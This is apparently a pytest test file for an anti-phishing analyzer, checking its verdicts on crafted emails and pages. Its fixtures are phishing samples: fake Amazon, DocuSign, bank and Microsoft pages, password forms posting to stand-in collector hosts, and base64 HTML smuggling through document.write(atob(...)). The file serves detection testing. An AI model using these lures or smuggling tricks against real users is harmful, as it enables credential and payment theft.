from email.message import EmailMessage
import pytest

from antiphish.analyzer import Analyzer


def mail(html):
    message=EmailMessage()
    message['From']='notifications@example.org'
    message['Subject']='Account notification'
    message.set_content('See the notification')
    message.add_alternative(html,subtype='html')
    return message.as_bytes()


@pytest.mark.parametrize('host,expected', [('www.amazon.com','NOT_DETECTED'),('payments-unrelated.example','SUSPICIOUS')])
def test_branded_payment_update_requires_destination_mismatch(empty_kb,host,expected):
    report=Analyzer(empty_kb).analyze(mail(f'<h1>Amazon</h1><p>Update payment information for your membership.</p><a href="https://{host}/billing">Update payment information</a>'),name='mail.eml')
    assert report.verdict.value == expected


@pytest.mark.parametrize('host,expected', [('www.docusign.net','NOT_DETECTED'),('ipfs.io','SUSPICIOUS')])
def test_document_service_on_user_hosting(empty_kb,host,expected):
    report=Analyzer(empty_kb).analyze(mail(f'<h1>DocuSign</h1><a href="https://{host}/document">Preview document</a>'),name='mail.eml')
    assert report.verdict.value == expected


def test_encoded_navigation_is_followed_but_other_script_urls_are_not(empty_kb):
    import base64
    from antiphish.network import FetchResult
    target='https://decoded-fixture.example/login'
    encoded=base64.b64encode(target.encode()).decode()
    body=f'<script>location.href=atob("{encoded}"); const asset="https://static-fixture.example/code.js";</script>'.encode()
    visited=[]
    def fetch(url,limits):
        visited.append(url)
        return FetchResult(b'<h1>Microsoft</h1><form action="/send"><input type=password></form>',url,[url],'text/html','200')
    report=Analyzer(empty_kb).analyze(body,name='redirect.html',network='http',fetcher=fetch)
    assert visited == [target]
    assert report.verdict.value == 'PHISHING'


@pytest.mark.parametrize('host,expected',[('vtb.ru','NOT_DETECTED'),('payout-unrelated.example','SUSPICIOUS')])
def test_bank_transfer_completion_route(empty_kb,host,expected):
    report=Analyzer(empty_kb).analyze(mail(f'<h1>ВТБ Банк</h1><p>Завершите вывод средств, указав реквизиты получателя.</p><a href="https://{host}/payment">Завершить перевод</a>'),name='notification.eml')
    assert report.verdict.value == expected


def test_html_smuggling_is_recovered_without_claiming_execution(empty_kb):
    import base64
    encoded=base64.b64encode(b'<h1>Microsoft</h1><form action="https://collector.example.net/send"><input type=password></form>').decode()
    body=f'<script>document.write(atob("{encoded}"));</script>'.encode()
    report=Analyzer(empty_kb).analyze(body,name='encoded.html')
    assert report.verdict.value == 'SUSPICIOUS'
    assert any(p.identity_source == 'decoded-script' and p.forms for p in report.pages)
    assert report.fingerprints['decoded_html'][0]['executed'] is False
    assert not any(e.code == 'PHISHING_FORM_ROUTE' for e in report.reason_codes)


def test_closed_pdf_password_dialog_and_template_are_not_collectors(empty_kb):
    html=b'<title>Report.pdf</title><h1>PDF viewer</h1><dialog id=passwordDialog><input type=password></dialog><template><form action="https://collector.example"><input type=password></form></template>'
    report=Analyzer(empty_kb).analyze(html,name='viewer.html',base_url='https://official-documents.example/report.pdf')
    assert report.verdict.value == 'NOT_DETECTED'
    assert not any(p.forms for p in report.pages)


def test_open_dialog_collector_remains_detectable(empty_kb):
    html=b'<h1>Microsoft</h1><dialog open><form action="/collect"><input type=password></form></dialog>'
    report=Analyzer(empty_kb).analyze(html,name='login.html',base_url='https://fake.example/login')
    assert report.verdict.value == 'PHISHING'


def test_access_gate_is_partial_not_phishing(empty_kb):
    report=Analyzer(empty_kb).analyze(b'<title>Just a moment...</title><script src="/challenge.js"></script>',name='gate.html',base_url='https://site.example/')
    assert report.verdict.value == 'NOT_DETECTED'
    assert report.analysis_status.value == 'PARTIAL'
